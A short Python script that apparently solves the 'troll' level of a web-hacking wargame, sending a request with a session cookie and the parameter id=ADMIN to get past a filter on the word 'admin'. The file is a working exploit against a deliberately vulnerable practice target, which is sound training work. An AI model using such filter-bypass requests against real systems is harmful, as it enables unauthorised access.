import requests

url = 'https://los.rubiya.kr/chall/troll_05b5eb65d94daf81c42dd44136cb0063.php'
cookie = {'PHPSESSID': 'dutaujsbjbkbm42o5v5t948kfm'}
payload = "?id=ADMIN"

r = requests.get(url + payload, cookies=cookie)
if 'TROLL Clear!' in r.text:
    print('TROLL Clear!')
